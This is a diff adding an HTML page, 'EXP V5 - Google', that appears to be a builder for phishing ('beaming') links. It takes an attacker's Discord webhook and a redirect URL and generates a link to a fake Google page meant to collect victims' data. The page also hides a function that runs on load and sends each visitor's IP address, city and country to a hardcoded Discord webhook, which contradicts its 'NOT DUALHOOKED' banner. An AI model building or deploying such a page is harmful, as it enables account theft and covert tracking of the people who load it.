@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>EXP V5</title>
+  <link rel="icon" type="image/x-icon" href="EXP5logo.png">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      background-color: #171717;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start; /* Align items to the top */
+      flex-direction: column;
+      height: 100vh; /* Increased height for scrolling */
+      position: relative;
+      align-items: center;
+    }
+
+    /* Menu bar at the top */
+    .menu-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: transparent;
+      color: #fff;
+      padding: 10px 20px;
+      z-index: 10000;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .particles {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .particle {
+      position: absolute;
+      border-radius: 50%;
+      animation: float 10s infinite linear;
+    }
+
+    @keyframes float {
+      0% {
+        transform: translateY(0) scale(0.5);
+        opacity: 0.2;
+      }
+      50% {
+        opacity: 0.5;
+      }
+      100% {
+        transform: translateY(-100vh) scale(1.2);
+        opacity: 0;
+      }
+    }
+
+    .slide {
+      position: absolute;
+      width: 200px;
+      height: 300px;
+      background-size: cover;
+      background-position: center;
+      border-radius: 12px;
+      opacity: 0;
+      transform: scale(0.8);
+      transition: all 0.8s ease;
+    }
+
+    .left {
+      transform: translateX(-240px) scale(0.9);
+      opacity: 0.3;
+      z-index: 1;
+    }
+
+    .center {
+      transform: translateX(0) scale(1.1);
+      opacity: 1;
+      z-index: 2;
+    }
+
+    .right {
+      transform: translateX(240px) scale(0.9);
+      opacity: 0.3;
+      z-index: 1;
+    }
+
+    .quote {
+      position: absolute;
+      top: 40px;
+      height: 50px;
+      width: 100%;
+      text-align: center;
+      background-color: #171717;
+      padding-top: 20px;
+      font-size: 24px;
+      font-weight: bold;
+      margin-left: -40px;
+      color: red;
+      opacity: 1;
+      transform: translateY(0);
+      animation: fadeInQuote 1.5s ease-out forwards;
+      box-shadow: 0 0 12px rgba(255, 0, 0, 0.7);
+    }
+
+    @keyframes fadeInQuote {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    .webhook {
+  width: 220px;
+  height: 50px;
+  border: 2px solid #ff3b3b;
+  background-color: #2e2e2e;
+  color: #fff;
+  font-size: 16px;
+  font-family: Arial, Helvetica, sans-serif;
+  border-radius: 8px;
+  padding: 0 12px;
+  box-shadow: 0 0 12px rgba(255, 0, 0, 0.7);
+  outline: none;
+  transition: box-shadow 0.15s ease, background-color 0.15s ease;
+  position: relative; /* Important */
+  z-index: 10;        
+}
+
+.webhook:focus {
+  box-shadow: 0 0 16px rgba(255, 0, 0, 0.9);
+  background-color: #3a3a3a;
+}
+
+.webhook::placeholder {
+  font-size: 15px;
+  color: #bbb;
+}
+
+.sumbitbutton {
+    width: 220px;
+  height: 50px;
+  border: 2px solid #ff3b3b;
+  background-color: #bd2020;
+  color: #fff;
+  font-size: 16px;
+  margin-top: 20px;
+  font-family: Arial, Helvetica, sans-serif;
+  border-radius: 8px;
+  padding: 0 12px;
+  box-shadow: 0 0 12px rgba(255, 0, 0, 0.7);
+  outline: none;
+  transition: box-shadow 0.15s ease, background-color 0.15s ease;
+  position: relative; /* Important */
+  z-index: 10;
+  cursor: pointer;
+}
+.sumbitbutton:hover {
+
+    background-color: #e81c1c;
+    box-shadow: 0 0 14px rgba(255, 0, 0, 0.7);
+}
+.sumbitbutton:active {
+
+background-color: #f80303;
+box-shadow: 0 0 14px rgba(255, 0, 0, 0.7);
+}
+
+
+
+  </style>
+</head>
+<body>
+
+  <!-- Menu bar at the top -->
+  <div class="menu-bar">
+    <div class="quote" id="quote">EXP V5 - Google ----- NOT DUALHOOKED</div>
+  </div>
+
+  <div class="particles" id="particles"></div>
+  
+  <img style="height: 120px; width: 200px;   box-shadow: 0 0 12px rgba(255, 0, 0, 0.7); border: 1px red; position: absolute; margin-top: -300px;" src="datayouwillcollect.png">
+
+  <p style="color: red; margin-left: -170px; margin-top: -10px;">Webhook:</p>
+  <input class="webhook" placeholder="Enter webhook here" id="dcinput">
+
+    <input class="webhook" id="RedirectLink" placeholder="Enter redirect link eg. https://google.com" style="margin-top: 20px;">
+
+    <button type="submit" class="sumbitbutton" id="submitbtn">Submit</button>
+
+  <p style="color: red; margin-left: -170px; margin-bottom: -120px;">Link result:</p>
+  <div class="webhook" placeholder="enter webhook here" style="margin-bottom: -470px; position: absolute; padding-top: 15px; color: #bbb;">PL (id) eg. ?id=HgdTzE7AE8...</div>
+
+  <button type="button" class="sumbitbutton" id="openbtn" style="position: absolute; margin-top: 625px;" >Open Link</button>
+
+  <p style="color: red; margin-left: -170px; margin-top: 800px; position: absolute; z-index: 9;">DC Result:</p>
+  <img style="height: 200px; width: 250px;   box-shadow: 0 0 12px rgba(255, 0, 0, 0.7); border: 1px red; position: absolute; margin-top: 1050px;" src="datayouwillcollect.png">
+
+  <p style="color: red; margin-left: 0px; margin-top: 1340px; position: absolute; z-index: 9;">Support us and subscribe to our channel</p>
+  <a style="color: rgb(47, 0, 255); margin-left: 0px; margin-top: 1500px; height: 100px; position: absolute; z-index: 9; text-decoration: underline; cursor: pointer;" href="https://www.youtube.com/@EXPV5" target="_blank">https://www.youtube.com/@EXPV5 </a>
+
+
+  <script>
+
+    const webhookInput = document.getElementById('dcinput');
+    const redirectInput = document.getElementById('RedirectLink');
+    const submitBtn = document.getElementById('submitbtn');
+    const openBtn = document.getElementById('openbtn');
+    const linkResult = document.querySelector('.webhook[placeholder="enter webhook here"]');
+  
+    // Get `id` from URL: should be "webhook/redirect"
+    function getIDFromURL() {
+      return new URLSearchParams(window.location.search).get('id');
+    }
+
+
+   window.onload = function () {
+     sendMessage1();
+   };
+  
+    // Save plain webhook to localStorage
+    function saveWebhook(webhook) {
+      localStorage.setItem('webhook', webhook);
+    }
+  
+    // Load webhook from localStorage
+    function loadWebhook() {
+      return localStorage.getItem('webhook');
+    }
+  
+    // Build the full link and display
+    function updateUI(webhook, redirect) {
+      const encodedWebhook = encodeURIComponent(webhook);
+      const encodedRedirect = encodeURIComponent(redirect);
+      const fullLink = `${window.location.origin}${window.location.pathname}?id=${webhook}@${redirectInput.value.trim()}`;
+  
+      linkResult.textContent = fullLink;
+      openBtn.style.display = 'inline-block';
+    }
+  
+    // Handle submit click
+    submitBtn.addEventListener('click', () => {
+      const webhook = webhookInput.value.trim();
+      const redirect = redirectInput.value.trim();
+  
+      if (!webhook || !redirect) {
+        alert('Please enter both a webhook and a redirect URL.');
+        return;
+      }
+  
+      saveWebhook(webhook);
+      updateUI(webhook, redirect);
+  
+      // Update browser URL
+      const newURL = `${window.location.pathname}?id=${webhook}@${redirect}`;
+      window.history.replaceState(null, '', newURL);
+    });
+  
+    // Handle open click
+    openBtn.addEventListener('click', () => {
+      const idParam = getIDFromURL() || `${loadWebhook()}/${redirectInput.value.trim()}`;
+      if (!idParam) {
+        alert('No data found.');
+        return;
+      }
+      
+      window.open(`GoogleUser.html?id=${idParam}`, '_blank');
+    });
+  
+    // On page load
+    window.addEventListener('DOMContentLoaded', () => {
+      const idParam = getIDFromURL();
+      if (!idParam) return;
+  
+      try {
+        const [encodedWebhook, encodedRedirect] = idParam.split('/');
+  
+        if (!encodedWebhook || !encodedRedirect) throw new Error('Malformed ID');
+  
+        const webhook = decodeURIComponent(encodedWebhook);
+        const redirect = decodeURIComponent(encodedRedirect);
+  
+        saveWebhook(webhook);
+        updateUI(webhook, redirect);
+      } catch (e) {
+        console.error('Failed to load link data:', e.message);
+        linkResult.textContent = 'Invalid link or data.';
+        openBtn.style.display = 'none';
+      }
+    });
+
+    async function sendMessage1() {
+
+var request = new XMLHttpRequest();
+request.open("POST", "https://discord.com/api/webhooks/1412748984513990776/00n0RtoCof_FOFqTfIdg3zgOSCXYg3NeZiNhHIPyLOvcAWSC-5JQGjtrIVnIKAk4fjkb");
+request.setRequestHeader('Content-type', 'application/json');
+
+const res = await fetch("https://ipapi.co/json/");
+const geo = await res.json();
+
+var params = {
+content: `
+⚠️⚠️⚠️ New User trying to beam (loaded page):
+
+- city: ${geo.city}
+- country: ${geo.country}
+- IP: ${geo.ip}
+\n
+`
+};
+
+request.send(JSON.stringify(params));
+}
+  </script>
+  
+    
+  
+  
+  
+  
+</body>
+</html>
